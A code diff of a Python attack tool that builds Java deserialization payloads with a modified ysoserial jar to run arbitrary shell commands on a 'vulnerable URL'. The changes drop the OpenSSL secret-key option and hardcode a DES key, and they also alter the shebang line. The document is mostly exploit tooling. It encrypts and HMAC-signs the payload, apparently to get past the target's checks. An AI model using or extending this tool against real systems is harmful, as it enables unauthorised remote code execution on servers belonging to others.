@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+##!/usr/bin/env python
 
 import hashlib
 import hmac
@@ -13,6 +13,8 @@ import fcntl
 import struct
 import netifaces
 import sys
+
+#os.system("clear")
 
 Bold='\033[1m'
 Red='\033[0;31m'
@@ -45,7 +47,6 @@ def get_arguments(testmode):
     parser.add_argument("-u", "--targetURL", dest="targetURL", help="Vulnerable URL.")
     parser.add_argument("-t", "--shellType", dest="ShellType", help="Shell type of command to execute (cmd/powershell/bash/none).")
     parser.add_argument("-c", "--command", dest="command", help="Command to execute.")
-    parser.add_argument("-k", "--secretkey", dest="secretKey", help="Secret key for encryption in OpenSSL.")
     parser.add_argument("-m", "--hmacKey", dest="hmacKey", help="HMAC key for encoding the HMAC payload.")
     parser.add_argument("-p", "--payload-type", dest="payloadType", help="Choose your type of payload.")
     parser.add_argument("-x", "--testrce", dest="testRCE", action='store_true', help="Use this to test RCE.")
@@ -61,8 +62,6 @@ def get_arguments(testmode):
             parser.error("[-] Please specify a command to execute, use -h or --help for more info.")
         else:
             command = ""
-    if not options.secretKey:
-        parser.error("[-] Please specify the secret key used in the OpenSSL encoder, something like (4a7346393837362d).")
     if not options.hmacKey:
         parser.error("[-] Please specify the secret key used in the HMAC encoder.")
     if not options.payloadType:
@@ -110,7 +109,6 @@ def showOptions(options, testmode):
     print(Blue + Bold + "- Shell type: " + NC + options.ShellType)
     if not testmode:
         print(Blue + Bold + "- Command: " + NC + options.command)
-    print(Blue + Bold + "- OpenSSL key: " + NC + options.secretKey)
     print(Blue + Bold + "- HMAC key: " + NC + options.hmacKey)
     print(Blue + Bold + "- Payload type: " + NC + options.payloadType)
     # print(Blue + Bold + "- MMAC algorithm: " + NC + hashdef)
@@ -144,7 +142,6 @@ def create_payload(options, testmode):
     typecommand = options.ShellType
     command = options.command
     targeturl = options.targetURL
-    key = options.secretKey
     payloadType = options.payloadType
     HMAC_Key = options.hmacKey
     showOptions(options, testmode)
@@ -156,7 +153,7 @@ def create_payload(options, testmode):
         print("")
         print(Green + Bold + " [+] "  + NC + "Creating payload with ysoserial.")
         os.popen('java -jar ysoserial-modified.jar ' + payloadType + ' ' + typecommand + ' \'' + command + '\' > command.bin')
-        os.popen('openssl enc -des-ecb -K ' + key + ' -in command.bin -out command.bin.enc')
+        os.popen('openssl enc -des-ecb -K 4a7346393837362d -in command.bin -out command.bin.enc')
 
         __module_id__ = "$Id$"
 
